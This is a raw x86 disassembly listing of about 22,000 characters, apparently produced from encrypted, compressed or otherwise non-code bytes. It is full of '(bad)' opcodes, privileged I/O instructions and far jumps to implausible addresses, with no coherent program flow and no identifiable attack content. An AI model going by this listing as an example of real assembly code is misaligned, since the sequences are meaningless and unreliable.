  40d575:	jge    0x40d591
  40d577:	ja     0x40d5a4
  40d579:	(bad)  
  40d57a:	in     al,0xc3
  40d57c:	inc    esp
  40d57d:	lods   al,BYTE PTR ds:[esi]
  40d57e:	int3   
  40d57f:	addr16 adc eax,0x1d44fe04
  40d585:	and    bl,BYTE PTR [edi-0x70]
  40d588:	add    ah,BYTE PTR [ebx-0x6276b961]
  40d58e:	jnp    0x40d51d
  40d590:	das    
  40d591:	push   ebp
  40d592:	xchg   esp,eax
  40d593:	loopne 0x40d5bc
  40d595:	pop    edi
  40d596:	(bad)  
  40d597:	(bad)  
  40d598:	sar    BYTE PTR [esi+0x70cd167d],1
  40d59e:	add    eax,0x9c5abe49
  40d5a3:	les    edi,FWORD PTR [esp+ebx*1+0x4f]
  40d5a7:	repnz mov bh,0xfa
  40d5aa:	push   ecx
  40d5ab:	or     ah,ah
  40d5ad:	mov    esp,0x7a9c3c6f
  40d5b2:	pop    ds
  40d5b3:	dec    esp
  40d5b4:	xchg   BYTE PTR [edx],ch
  40d5b6:	mov    al,0x1c
  40d5b8:	clc    
  40d5b9:	jmp    0xc44b363c
  40d5be:	das    
  40d5bf:	repnz cdq 
  40d5c1:	aas    
  40d5c2:	lods   al,BYTE PTR ds:[esi]
  40d5c3:	adc    BYTE PTR [ebx+0x3c874b74],bl
  40d5c9:	sar    BYTE PTR [esi+0x32],1
  40d5cc:	cld    
  40d5cd:	std    
  40d5ce:	fist   DWORD PTR [ebp-0x5d399a7b]
  40d5d4:	dec    esp
  40d5d5:	pop    edi
  40d5d6:	int3   
  40d5d7:	sub    BYTE PTR [edx-0x2d],cl
  40d5da:	cmp    al,0xa5
  40d5dc:	nop
  40d5dd:	sbb    ebp,DWORD PTR [edx-0x4f]
  40d5e0:	jb     0x40d56d
  40d5e2:	push   ds
  40d5e3:	jl     0x40d594
  40d5e5:	lock jle 0x40d599
  40d5e8:	shl    DWORD PTR [eax],0x9c
  40d5eb:	call   0xbb49:0xa59beda5
  40d5f2:	mov    BYTE PTR [eax-0x26d3773f],ch
  40d5f8:	test   eax,0xb3f5bce6
  40d5fe:	xor    ebp,esp
  40d600:	retf   0xb1b6
  40d603:	lods   al,BYTE PTR ds:[esi]
  40d604:	push   ebp
  40d605:	mov    al,0x5c
  40d607:	hlt    
  40d608:	xor    eax,0x83f90024
  40d60d:	(bad)
  40d610:	fdiv   st,st(6)
  40d612:	sub    al,0x5b
  40d614:	sar    DWORD PTR [ebx+0x728297d6],1
  40d61a:	add    al,0x2b
  40d61c:	mov    al,ds:0xcc7dd598
  40d621:	adc    DWORD PTR [ebx+0x27],edx
  40d624:	jle    0x40d60a
  40d626:	cmp    dh,bl
  40d628:	iret   
  40d629:	sti    
  40d62a:	or     DWORD PTR [ebx-0xb9234c9],0x70
  40d631:	(bad)  
  40d632:	adc    DWORD PTR [ecx],ebx
  40d634:	pmuludq mm1,QWORD PTR [ecx+edi*1+0x7ce4f77b]
  40d63c:	lods   al,BYTE PTR ds:[esi]
  40d63d:	js     0x40d668
  40d63f:	outs   dx,BYTE PTR ds:[esi]
  40d640:	xor    al,0xbb
  40d642:	push   esi
  40d643:	ds mov esp,0x57ef85ab
  40d649:	mov    ebx,0x53928545
  40d64e:	cli    
  40d64f:	cdq    
  40d650:	sbb    ebp,0xffffff95
  40d653:	or     al,0xba
  40d655:	in     eax,dx
  40d656:	xchg   DWORD PTR [ecx],eax
  40d658:	in     eax,0xc
  40d65a:	(bad)  
  40d65b:	or     eax,0x7ad878ae
  40d660:	or     BYTE PTR [ebx+eax*4-0x49],cl
  40d664:	inc    ebp
  40d665:	jl     0x40d6c3
  40d667:	jge    0x40d659
  40d669:	dec    ebp
  40d66a:	cmp    esp,ebp
  40d66c:	mov    al,0x67
  40d66e:	stos   BYTE PTR es:[edi],al
  40d66f:	out    dx,eax
  40d670:	(bad)  
  40d671:	stos   BYTE PTR es:[edi],al
  40d672:	and    eax,0x850e894c
  40d677:	xor    dh,BYTE PTR [edx+0x33cb0653]
  40d67d:	adc    DWORD PTR [ebx],ecx
  40d67f:	bound  edi,QWORD PTR [ebx-0x4fcfe975]
  40d685:	sbb    edi,edx
  40d687:	sub    esi,ebx
  40d689:	xlat   BYTE PTR ds:[ebx]
  40d68a:	mov    al,0xa0
  40d68c:	bound  ebp,QWORD PTR [eax+ecx*4]
  40d68f:	mov    ?,WORD PTR [ebx-0x1e4843b8]
  40d695:	and    edi,DWORD PTR [edx+0x5936b1d0]
  40d69b:	mov    cl,0x8d
  40d69d:	mov    bl,0xaf
  40d69f:	xor    bl,BYTE PTR [edi]
  40d6a1:	retf   0xa5e4
  40d6a4:	mov    ah,0x6e
  40d6a6:	sbb    BYTE PTR [eax],al
  40d6a8:	cdq    
  40d6a9:	repz xor bh,BYTE PTR [edx]
  40d6ac:	shl    DWORD PTR [eax+0x64],0xa9
  40d6b0:	push   edx
  40d6b1:	cdq    
  40d6b2:	and    BYTE PTR [ebx],dl
  40d6b4:	dec    edi
  40d6b5:	sub    dl,BYTE PTR [eax]
  40d6b7:	push   0x1a44f7ed
  40d6bc:	mov    es,WORD PTR [esi+eax*4-0x40602570]
  40d6c3:	(bad)  
  40d6c4:	and    eax,0xd3f17387
  40d6c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ca:	shr    esp,0x53
  40d6cd:	inc    edx
  40d6ce:	or     al,BYTE PTR ss:0x5cb65e17
  40d6d5:	mov    ecx,0xd786eef3
  40d6da:	out    0x5c,al
  40d6dc:	mov    edi,0x6ad546b4
  40d6e1:	adc    BYTE PTR [eax-0x62],0x5c
  40d6e5:	ins    DWORD PTR es:[edi],dx
  40d6e6:	clc    
  40d6e7:	std    
  40d6e8:	cmp    BYTE PTR [esp+edx*4+0x7cd6b60a],ah
  40d6ef:	mov    al,0x29
  40d6f1:	fisttp DWORD PTR [edi-0x3b761dff]
  40d6f7:	inc    ebp
  40d6f8:	inc    eax
  40d6f9:	jmp    0x67a44262
  40d6fe:	lods   al,BYTE PTR ds:[esi]
  40d6ff:	ret    0xa329
  40d702:	(bad)  [esi+0x46]
  40d705:	and    al,0xe
  40d707:	shl    al,0x7a
  40d70a:	dec    edi
  40d70b:	(bad)  
  40d70d:	rol    BYTE PTR [ebx],0x1b
  40d710:	jle    0x40d6f3
  40d712:	pushf  
  40d713:	jae    0x40d6bb
  40d715:	je     0x40d75e
  40d717:	mov    bh,0xb2
  40d719:	or     eax,0xafdd6744
  40d71e:	sahf   
  40d71f:	xor    DWORD PTR [ebx],ebx
  40d721:	xchg   ebx,eax
  40d722:	icebp  
  40d723:	mov    dh,bh
  40d725:	jbe    0x40d6fd
  40d727:	clc    
  40d728:	sub    eax,0x4700df7c
  40d72d:	pop    edi
  40d72e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d72f:	bndldx (bad),[esi-0x18]
  40d733:	jge    0x40d6c2
  40d735:	adc    DWORD PTR [edx+0x7d53d1a1],0xffffffbb
  40d73c:	adc    edi,ecx
  40d73e:	daa    
  40d73f:	mov    dl,ah
  40d741:	jo     0x40d74b
  40d743:	fcmove st,st(6)
  40d745:	xchg   edi,eax
  40d746:	outs   dx,BYTE PTR ds:[esi]
  40d747:	mov    eax,0xabf16855
  40d74c:	inc    ebx
  40d74d:	aaa    
  40d74e:	inc    ebp
  40d74f:	out    0xd2,eax
  40d751:	adc    al,0x70
  40d753:	in     al,dx
  40d754:	and    dl,BYTE PTR [esi+0x75]
  40d757:	cmp    BYTE PTR [eax-0x9ab37ff],cl
  40d75d:	call   0x4c8:0xdee73021
  40d764:	lds    esi,FWORD PTR [ecx+0xb]
  40d767:	fist   DWORD PTR [edx+0x6b591cca]
  40d76d:	cmc    
  40d76e:	pop    eax
  40d76f:	or     dh,BYTE PTR [esi]
  40d771:	xchg   ecx,eax
  40d772:	aas    
  40d773:	test   BYTE PTR ds:0xbf729ee0,cl
  40d779:	adc    BYTE PTR [eax+0x28],ah
  40d77c:	dec    edi
  40d77d:	out    0x77,al
  40d77f:	fdiv   QWORD PTR [ebx+0x3500a54a]
  40d785:	push   esi
  40d786:	push   ds
  40d787:	pop    ebp
  40d788:	fidivr WORD PTR [esi]
  40d78a:	mov    fs,WORD PTR [edx-0x6ab7c332]
  40d790:	mov    bh,0xf8
  40d792:	nop
  40d793:	enter  0xeb21,0x6b
  40d797:	mov    dh,bl
  40d799:	ss stos DWORD PTR es:[edi],eax
  40d79b:	sbb    DWORD PTR [ecx-0x20009e2d],eax
  40d7a1:	fcom   QWORD PTR [ebx-0x18d69999]
  40d7a7:	xor    BYTE PTR [edx-0x1bb197c],0xce
  40d7ae:	dec    edi
  40d7af:	(bad)  
  40d7b0:	mov    ch,0x7d
  40d7b2:	mov    ah,0xb8
  40d7b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7b5:	xchg   esp,eax
  40d7b6:	sbb    ebx,esp
  40d7b8:	mov    cl,0x21
  40d7ba:	xor    al,0x22
  40d7bc:	mov    DWORD PTR [ecx+edi*2+0x6a],edx
  40d7c0:	lds    ebp,FWORD PTR [edx-0x50]
  40d7c3:	cmp    eax,0xb6c71930
  40d7c8:	mov    edx,0x13eb4159
  40d7cd:	mov    ds:0x30d30d2,eax
  40d7d2:	fild   WORD PTR [eax+0x54]
  40d7d5:	dec    esi
  40d7d6:	inc    eax
  40d7d7:	adc    al,0xcc
  40d7d9:	mov    BYTE PTR [edx-0x6f55bfe3],cl
  40d7df:	jnp    0x40d82f
  40d7e1:	out    0x83,al
  40d7e3:	mov    cl,al
  40d7e5:	push   ds
  40d7e6:	hlt    
  40d7e7:	pop    ecx
  40d7e8:	in     al,0xfd
  40d7ea:	sbb    dh,BYTE PTR [edi+0x7e11a314]
  40d7f0:	pop    ebx
  40d7f1:	jbe    0x40d847
  40d7f3:	jecxz  0x40d846
  40d7f5:	sub    ecx,DWORD PTR [esi+0x101a00ed]
  40d7fb:	mov    ebx,0xe87f4bfb
  40d800:	rcr    DWORD PTR [ebx],0xdc
  40d803:	lock sub bh,BYTE PTR [ebx+0x4]
  40d807:	ss dec esi
  40d809:	inc    edi
  40d80a:	and    edx,ecx
  40d80c:	lds    ebp,FWORD PTR [ebp-0x7b24d99d]
  40d812:	push   ss
  40d813:	add    eax,0x3324088b
  40d818:	add    edx,DWORD PTR [eax+0x1]
  40d81b:	cdq    
  40d81c:	xchg   ecx,eax
  40d81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d81e:	xor    dh,al
  40d820:	iret   
  40d821:	mov    ah,BYTE PTR [esi+0x16]
  40d824:	sbb    bh,al
  40d826:	pop    esp
  40d827:	lock inc ebx
  40d829:	jg     0x40d87d
  40d82b:	addr16 mov ds:0x3a54,al
  40d82f:	popf   
  40d830:	inc    esp
  40d831:	and    esp,DWORD PTR [edx+edi*4+0x79]
  40d835:	pusha  
  40d836:	pop    ss
  40d837:	adc    eax,ebp
  40d839:	mov    BYTE PTR [eax+0x13d068fe],0xbc
  40d840:	data16 adc al,0x66
  40d843:	push   0x2c
  40d845:	pusha  
  40d846:	xlat   BYTE PTR ds:[ebx]
  40d847:	cmp    eax,0xff62bfa9
  40d84c:	pop    ebx
  40d84d:	lea    esi,[edi]
  40d84f:	inc    BYTE PTR [edi]
  40d851:	(bad)  
  40d852:	and    cl,BYTE PTR [ebx]
  40d854:	fwait
  40d855:	int3   
  40d856:	les    esi,FWORD PTR [esi]
  40d858:	push   0x763c8cb4
  40d85d:	cmp    eax,DWORD PTR ds:0x83f9acd5
  40d863:	push   edx
  40d864:	push   ss
  40d865:	(bad)  
  40d866:	loop   0x40d8d9
  40d868:	hlt    
  40d869:	inc    esp
  40d86a:	std    
  40d86b:	lea    esi,[edi-0x23005b8a]
  40d871:	xchg   esi,eax
  40d872:	ja     0x40d81d
  40d874:	out    dx,al
  40d875:	and    eax,0x4c613d23
  40d87a:	and    BYTE PTR [ebp-0x1663d6b3],0xdb
  40d881:	xor    eax,0x7489f07f
  40d886:	xchg   edx,eax
  40d887:	aaa    
  40d888:	xor    DWORD PTR [edi],ebx
  40d88a:	add    al,0x2e
  40d88c:	jmp    0xcf79854f
  40d891:	add    eax,DWORD PTR [edi+0x18]
  40d894:	jecxz  0x40d8a8
  40d896:	xchg   ecx,eax
  40d897:	pop    edi
  40d898:	outs   dx,DWORD PTR ds:[esi]
  40d899:	or     al,ah
  40d89b:	push   0xffffff8f
  40d89d:	lahf   
  40d89e:	or     ch,BYTE PTR ds:[eax]
  40d8a1:	mov    ds:0x1994cb5,al
  40d8a6:	inc    esi
  40d8a7:	cmp    al,0x5
  40d8a9:	fdivr  QWORD PTR [ebp+edx*2+0x21]
  40d8ad:	pop    esp
  40d8ae:	and    bl,BYTE PTR [edx]
  40d8b0:	jno    0x40d85b
  40d8b2:	pop    ecx
  40d8b3:	test   DWORD PTR [ebx-0x40],edi
  40d8b6:	pop    edx
  40d8b7:	mov    dh,0x89
  40d8b9:	arpl   ax,di
  40d8bb:	outs   dx,BYTE PTR ds:[esi]
  40d8bc:	bnd jb 0x40d8c1
  40d8bf:	inc    ecx
  40d8c0:	int    0xe0
  40d8c2:	pop    edx
  40d8c3:	out    dx,al
  40d8c4:	mov    esi,0xa4d4eab9
  40d8c9:	mov    ah,0x27
  40d8cb:	outs   dx,BYTE PTR ds:[esi]
  40d8cc:	push   eax
  40d8cd:	jns    0x40d857
  40d8cf:	or     eax,0x24d1c65d
  40d8d4:	and    eax,0xf79b5721
  40d8d9:	cmp    BYTE PTR [eax],bl
  40d8db:	cwde   
  40d8dc:	push   cs
  40d8dd:	mov    ah,0x1d
  40d8df:	jb     0x40d8c2
  40d8e1:	sbb    eax,0xeead802b
  40d8e6:	mov    esi,0x6b781898
  40d8eb:	ss jg  0x40d8c1
  40d8ee:	mov    sp,0x4915
  40d8f2:	(bad)  
  40d8f3:	hlt    
  40d8f4:	push   esi
  40d8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f6:	popf   
  40d8f7:	pop    ebp
  40d8f8:	pusha  
  40d8f9:	inc    ebx
  40d8fa:	ins    BYTE PTR es:[edi],dx
  40d8fb:	and    al,0x92
  40d8fd:	jns    0x40d8c2
  40d8ff:	pushf  
  40d900:	jl     0x40d8b9
  40d902:	jge    0x40d8a9
  40d904:	xchg   BYTE PTR [esi-0x7d5cfddd],bh
  40d90a:	mov    cl,0x25
  40d90c:	jne    0x40d8c5
  40d90e:	ror    BYTE PTR gs:[ecx-0x4e],1
  40d912:	xor    ch,BYTE PTR [ebx]
  40d914:	les    eax,FWORD PTR [esi+0x46]
  40d917:	xor    ecx,DWORD PTR [edx-0x54f90324]
  40d91d:	jae    0x40d8a5
  40d91f:	imul   edi,DWORD PTR [ecx],0x76
  40d922:	mov    ecx,0xbb925a14
  40d927:	add    BYTE PTR [ecx+0x3d02844f],dh
  40d92d:	xor    DWORD PTR [ebx+eiz*2+0x37d0ddf],ebx
  40d934:	adc    ch,BYTE PTR [eax+0x4b]
  40d937:	stc    
  40d938:	imul   BYTE PTR [edi+0x1178cfc7]
  40d93e:	inc    ecx
  40d93f:	xchg   edi,eax
  40d940:	push   ss
  40d941:	pusha  
  40d942:	popf   
  40d943:	cmp    ebp,DWORD PTR [edi+ebx*4+0x4fea722a]
  40d94a:	ret    0xeae8
  40d94d:	pop    ss
  40d94e:	jo     0x40d8f5
  40d950:	out    dx,al
  40d951:	test   al,0x18
  40d953:	push   esp
  40d954:	pop    ebx
  40d955:	lahf   
  40d956:	adc    DWORD PTR [esi+0x4b],ebp
  40d959:	rol    DWORD PTR [ecx-0x41],0x3
  40d95d:	imul   ebp,DWORD PTR [ebx+0x6079133f],0x3e
  40d964:	jp     0x40d9a9
  40d966:	in     eax,0x6c
  40d968:	cmp    bh,dl
  40d96a:	dec    edx
  40d96b:	scas   eax,DWORD PTR es:[edi]
  40d96c:	sti    
  40d96d:	push   es
  40d96e:	jbe    0x40d9be
  40d970:	aad    0x42
  40d972:	rcl    DWORD PTR [esi-0x1b2a11a8],0x1e
  40d979:	mov    ?,WORD PTR [edi+0x59785714]
  40d97f:	fcom   DWORD PTR [ecx]
  40d981:	jp     0x40d951
  40d983:	mov    ds:0x6a305974,al
  40d988:	(bad)  
  40d989:	fs pop ecx
  40d98b:	(bad)  
  40d98c:	mov    dl,0xe
  40d98e:	mov    ebx,0xc7049c5d
  40d993:	add    DWORD PTR [esp+ecx*1+0x52],ebx
  40d997:	push   eax
  40d998:	orps   xmm1,XMMWORD PTR [esi]
  40d99b:	sbb    eax,0xa82c5d00
  40d9a0:	rcl    BYTE PTR [esi-0x46],cl
  40d9a3:	pop    ss
  40d9a4:	das    
  40d9a5:	dec    eax
  40d9a6:	(bad)
  40d9a9:	mov    edx,ebp
  40d9ab:	jmp    0x40d936
  40d9ad:	mov    esp,0xb2a38cc
  40d9b2:	jne    0x40d985
  40d9b4:	add    bh,dl
  40d9b6:	or     al,0x96
  40d9b8:	shl    esp,cl
  40d9ba:	loope  0x40d95d
  40d9bc:	jnp    0x40d9ad
  40d9be:	add    BYTE PTR [ecx+ecx*2+0x3e029b70],0x31
  40d9c6:	and    ebx,esi
  40d9c8:	fwait
  40d9c9:	pushf  
  40d9ca:	inc    eax
  40d9cb:	sbb    al,0x1d
  40d9cd:	pop    eax
  40d9ce:	jb     0x40d997
  40d9d0:	cdq    
  40d9d1:	mov    ?,WORD PTR [ecx-0x69]
  40d9d4:	jo     0x40da48
  40d9d6:	mov    esi,0xeb195747
  40d9db:	jnp    0x40d9b0
  40d9dd:	pop    ecx
  40d9de:	pop    ebx
  40d9df:	xchg   ebx,eax
  40d9e0:	addr16 call 0x111f:0x627d6103
  40d9e8:	icebp  
  40d9e9:	retf   0x5308
  40d9ec:	mov    esp,0x45745db5
  40d9f1:	jae    0x40d97c
  40d9f3:	xor    al,0x41
  40d9f5:	test   eax,0x78ca9588
  40d9fa:	test   BYTE PTR [ebx],cl
  40d9fc:	mov    edi,eax
  40d9fe:	add    eax,0xc2fccb05
  40da03:	jl     0x40d9f0
  40da05:	xchg   BYTE PTR ds:0x7482818a,bl
  40da0b:	mov    ds:0xf8ff2be3,eax
  40da10:	or     esp,DWORD PTR [edx]
  40da12:	(bad)  
  40da13:	cmp    eax,0x9610d5ad
  40da18:	mov    cl,dl
  40da1a:	clc    
  40da1b:	retf   0xaed
  40da1e:	ja     0x40d9a2
  40da20:	pop    esi
  40da21:	out    dx,al
  40da22:	loopne 0x40da4a
  40da24:	pushf  
  40da25:	pop    edx
  40da26:	push   0x33fd4e81
  40da2b:	and    ebp,ebp
  40da2d:	mul    dh
  40da2f:	dec    edx
  40da30:	cmp    al,0xe3
  40da32:	fisubr DWORD PTR [ebx]
  40da34:	add    eax,edi
  40da36:	daa    
  40da37:	cmp    DWORD PTR fs:[eax+0x5391ee9b],ebp
  40da3e:	cmp    bh,BYTE PTR [eax]
  40da40:	imul   ebp,DWORD PTR [ecx+ebx*4+0x5b],0x3ebdfa1c
  40da48:	outs   dx,BYTE PTR ds:[esi]
  40da49:	cmc    
  40da4a:	mov    eax,ds:0xf25f1165
  40da4f:	inc    esi
  40da50:	xor    DWORD PTR [ecx+0x529cda73],0x61
  40da57:	sti    
  40da58:	dec    esi
  40da59:	fs js  0x40da37
  40da5c:	in     al,dx
  40da5d:	test   eax,0x68723931
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	mov    al,0xec
  40da65:	sbb    al,0x88
  40da67:	mov    dl,0x3
  40da69:	xchg   esp,eax
  40da6a:	jle    0x40da17
  40da6c:	daa    
  40da6d:	addr16 test al,0x1a
  40da70:	mov    eax,0x3611df8f
  40da75:	bound  eax,QWORD PTR [esi-0x7a3e6a61]
  40da7b:	data16 jle 0x40da48
  40da7e:	loope  0x40daae
  40da80:	mov    ebx,0x2d6d4724
  40da85:	xchg   esi,eax
  40da86:	test   ebx,ebp
  40da88:	and    BYTE PTR [ecx+0x2],bh
  40da8b:	std    
  40da8c:	cld    
  40da8d:	xchg   edi,eax
  40da8e:	mov    BYTE PTR ds:0xa4617583,ch
  40da94:	daa    
  40da95:	mov    bh,0xf7
  40da97:	ins    DWORD PTR es:[edi],dx
  40da98:	mov    WORD PTR [ebx+0x71],cs
  40da9b:	cmp    al,0xe2
  40da9d:	jg     0x40dade
  40da9f:	sti    
  40daa0:	pop    esi
  40daa1:	push   eax
  40daa2:	mov    esi,0xa5f60aa5
  40daa7:	adc    ecx,esi
  40daa9:	dec    esi
  40daaa:	arpl   WORD PTR [ebp+0x1b92f91c],si
  40dab0:	inc    edx
  40dab1:	out    dx,al
  40dab2:	mov    eax,0xeef67ed6
  40dab7:	inc    esi
  40dab8:	pop    eax
  40dab9:	loopne 0x40daf1
  40dabb:	stos   BYTE PTR es:[edi],al
  40dabc:	mov    ds:0xed3e55f1,al
  40dac1:	sub    dl,BYTE PTR [ebx]
  40dac3:	dec    ebx
  40dac4:	lahf   
  40dac5:	inc    edx
  40dac6:	mov    ecx,0x2e1f3059
  40dacb:	jno    0x40da8f
  40dacd:	loope  0x40db05
  40dacf:	cld    
  40dad0:	mov    ebp,0x54f6683e
  40dad5:	xlat   BYTE PTR ds:[ebx]
  40dad6:	aaa    
  40dad7:	sbb    ecx,DWORD PTR [ebp+ebx*2+0x5c7d6653]
  40dade:	xchg   edi,eax
  40dadf:	scas   eax,DWORD PTR es:[edi]
  40dae0:	(bad)  
  40dae1:	std    
  40dae2:	ret    
  40dae3:	sbb    DWORD PTR ds:0x71d45ae6,eax
  40dae9:	retf   
  40daea:	push   edx
  40daeb:	pop    ss
  40daec:	mov    esp,0x160b639c
  40daf1:	leave  
  40daf2:	stos   DWORD PTR es:[edi],eax
  40daf3:	and    al,0x22
  40daf5:	cmp    al,0x9d
  40daf7:	mov    edx,DWORD PTR [ecx+0x39425050]
  40dafd:	aam    0x6a
  40daff:	sbb    ecx,DWORD PTR [ebx]
  40db01:	daa    
  40db02:	or     eax,0x89aa534f
  40db07:	pop    eax
  40db08:	call   0xddc4:0xc57502be
  40db0f:	fbld   TBYTE PTR [esi-0x1]
  40db12:	jmp    0x40db7b
  40db14:	popa   
  40db15:	and    dl,dh
  40db17:	pop    esi
  40db18:	(bad)  
  40db19:	outs   dx,DWORD PTR ds:[esi]
  40db1a:	stc    
  40db1b:	mov    eax,ds:0xd8ff5149
  40db20:	push   es
  40db21:	cwde   
  40db22:	or     BYTE PTR [edi+0x1b1b669e],bl
  40db28:	imul   edi,DWORD PTR ds:0xadc129b9,0xffffffc9
  40db2f:	jg     0x40dace
  40db31:	jnp    0x40daf0
  40db33:	fldenv ds:0xd6845eb2
  40db39:	dec    ebp
  40db3a:	shl    BYTE PTR ds:0xa2a08884,0x97
  40db41:	or     eax,0x5aa6a562
  40db46:	leave  
  40db47:	les    eax,FWORD PTR [esi]
  40db49:	fistp  DWORD PTR [esi]
  40db4b:	push   edi
  40db4c:	cwde   
  40db4d:	xor    eax,0xe2c0bbce
  40db52:	sub    eax,0xf078fcd1
  40db57:	in     al,dx
  40db58:	inc    esp
  40db59:	scas   al,BYTE PTR es:[edi]
  40db5a:	add    eax,0xb5583661
  40db5f:	test   DWORD PTR [eax*8-0xafeb7be],esi
  40db66:	lahf   
  40db67:	test   BYTE PTR [edx-0x7184529],dl
  40db6d:	dec    edi
  40db6e:	xor    esp,DWORD PTR [esi]
  40db70:	xchg   ecx,eax
  40db71:	push   es
  40db72:	mov    dh,0x2f
  40db74:	jno    0x40db98
  40db76:	adc    DWORD PTR [eax+0x7e73d2a6],ebx
  40db7c:	add    DWORD PTR [esi],0x32627bd5
  40db82:	cwde   
  40db83:	arpl   WORD PTR [ecx],si
  40db85:	xor    eax,0x3a8a39ec
  40db8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db8b:	xor    eax,0xdcc5fb86
  40db90:	ins    BYTE PTR es:[edi],dx
  40db91:	repnz fild DWORD PTR [ecx]
  40db94:	sub    BYTE PTR [esi],al
  40db96:	xchg   ecx,eax
  40db97:	cld    
  40db98:	jge    0x40db54
  40db9a:	iret   
  40db9b:	push   0x6d8a1b74
  40dba0:	pop    ss
  40dba1:	arpl   WORD PTR [eax+0x647083aa],sp
  40dba7:	sbb    eax,0x72b42327
  40dbac:	mov    dh,0x14
  40dbae:	add    eax,0xe0b294bc
  40dbb3:	mov    al,ds:0x9910c7ab
  40dbb8:	test   al,0x1a
  40dbba:	pusha  
  40dbbb:	pusha  
  40dbbc:	inc    esp
  40dbbd:	and    dl,BYTE PTR [eax+0x12c1ce97]
  40dbc3:	adc    ah,BYTE PTR [ebp-0x1d]
  40dbc6:	cmp    BYTE PTR [edx+0x6d0ae741],ch
  40dbcc:	and    dl,BYTE PTR [ebx+0x2089dcb5]
  40dbd2:	gs int3 
  40dbd4:	jecxz  0x40dc54
  40dbd6:	or     edi,DWORD PTR [edx+0x48d929f0]
  40dbdc:	add    eax,0xffffffad
  40dbdf:	(bad)  
  40dbe0:	loop   0x40dc1d
  40dbe2:	push   eax
  40dbe3:	sub    BYTE PTR [ebx],dh
  40dbe5:	fldenv [ebx-0xf73f7cf]
  40dbeb:	sub    al,0xa6
  40dbed:	add    DWORD PTR [eax],edi
  40dbef:	xor    esi,DWORD PTR [edx-0x2c]
  40dbf2:	push   ebp
  40dbf3:	lds    ecx,FWORD PTR [eax-0x72]
  40dbf6:	addr16 push ecx
  40dbf8:	lahf   
  40dbf9:	mov    eax,0x1acf26ef
  40dbfe:	mov    esp,DWORD PTR [edx]
  40dc00:	jle    0x40dbe7
  40dc02:	mov    edx,0x78b35970
  40dc07:	push   ds
  40dc08:	leave  
  40dc09:	adc    bh,ah
  40dc0b:	adc    DWORD PTR [ebx-0x203eb687],0xfffffffc
  40dc12:	sbb    eax,0x21088963
  40dc17:	mov    dh,0x38
  40dc19:	cdq    
  40dc1a:	pusha  
  40dc1b:	aaa    
  40dc1c:	outs   dx,BYTE PTR ds:[esi]
  40dc1d:	jmp    0x19f4:0x4e513bdc
  40dc24:	sbb    BYTE PTR [ebp-0x7e380968],0x19
  40dc2b:	call   0x9979c309
  40dc30:	loope  0x40dc95
  40dc32:	fisub  DWORD PTR [ebx-0x6bbe7cde]
  40dc38:	daa    
  40dc39:	push   eax
  40dc3a:	loope  0x40dca8
  40dc3c:	mov    ah,0xc8
  40dc3e:	and    ah,al
  40dc40:	nop
  40dc41:	mov    bl,ch
  40dc43:	ja     0x40dc8a
  40dc45:	or     esp,esp
  40dc47:	lods   eax,DWORD PTR ds:[esi]
  40dc48:	sub    DWORD PTR [ecx],edx
  40dc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc4b:	push   ds
  40dc4c:	push   0x92a2cf24
  40dc51:	jmp    0xbdcf:0x3037b93f
  40dc58:	add    eax,0x853fe34f
  40dc5d:	push   esi
  40dc5e:	jo     0x40dbf8
  40dc60:	xchg   DWORD PTR [esi+0x1326b473],esp
  40dc66:	xor    BYTE PTR [ecx+edi*8-0x4a3cf28b],bl
  40dc6d:	push   esi
  40dc6e:	xchg   ebx,eax
  40dc6f:	push   ecx
  40dc70:	sbb    BYTE PTR [ebx+0x7a689879],al
  40dc76:	aaa    
  40dc77:	or     BYTE PTR [edx+eax*2-0x43205345],ah
  40dc7e:	dec    ebp
  40dc7f:	loope  0x40dc56
  40dc81:	jae    0x40dc71
  40dc83:	mov    al,ds:0x9e33eb9a
  40dc88:	sahf   
  40dc89:	ja     0x40dc41
  40dc8b:	bound  esi,QWORD PTR [edi+0x71]
  40dc8e:	mov    cs,WORD PTR [esi-0x6cf7c67b]
  40dc94:	pop    ss
  40dc95:	sahf   
  40dc96:	stos   BYTE PTR es:[edi],al
  40dc97:	cmp    esp,esi
  40dc99:	test   DWORD PTR [ebx-0x355cd4d3],0x293c49ec
  40dca3:	mov    ebp,edx
  40dca5:	icebp  
  40dca6:	gs ins BYTE PTR es:[edi],dx
  40dca8:	sub    bh,BYTE PTR ds:0x65e49a26
  40dcae:	fild   WORD PTR [ebp+ebp*8-0x6011e89a]
  40dcb5:	adc    al,0xe5
  40dcb7:	adc    BYTE PTR [ecx+0x57147aa3],dh
  40dcbd:	or     eax,0x16770c9a
  40dcc2:	(bad)
  40dcc5:	clc    
  40dcc6:	sbb    ebx,ebx
  40dcc8:	mov    ds:0x77f2bfad,eax
  40dccd:	mov    dl,0x7c
  40dccf:	or     DWORD PTR [ebx-0x5d],0xe
  40dcd3:	or     ebp,DWORD PTR [eax-0x89d86ed]
  40dcd9:	sub    al,0xee
  40dcdb:	movsx  edi,dh
  40dcde:	jge    0x40dcfa
  40dce0:	sbb    DWORD PTR [si+0x7],edi
  40dce4:	jl     0x40dc9b
  40dce6:	xlat   BYTE PTR ds:[ebx]
  40dce7:	pop    eax
  40dce8:	inc    esp
  40dce9:	push   es
  40dcea:	push   ebx
  40dceb:	push   DWORD PTR [ecx]
  40dced:	int    0xa3
  40dcef:	stos   DWORD PTR es:[edi],eax
  40dcf0:	jecxz  0x40dc7e
  40dcf2:	xchg   BYTE PTR gs:[ebp+0x10],al
  40dcf6:	push   cs
  40dcf7:	or     esi,DWORD PTR [eax-0x19698aa0]
  40dcfd:	pop    eax
  40dcfe:	gs jmp 0x8136177a
  40dd04:	repz mov esi,0x556ba5f
  40dd0a:	inc    ecx
  40dd0b:	dec    ecx
  40dd0c:	mov    edx,0xcacd99ce
  40dd11:	shl    cl,0x63
  40dd14:	or     edx,esi
  40dd16:	cmp    esi,DWORD PTR [edi+0x25fa81b3]
  40dd1c:	push   ebp
  40dd1d:	repz adc eax,0xe41708bc
  40dd23:	jl     0x40dcfb
  40dd25:	mov    ds:0x80265727,eax
  40dd2a:	cmp    bh,BYTE PTR fs:[ecx]
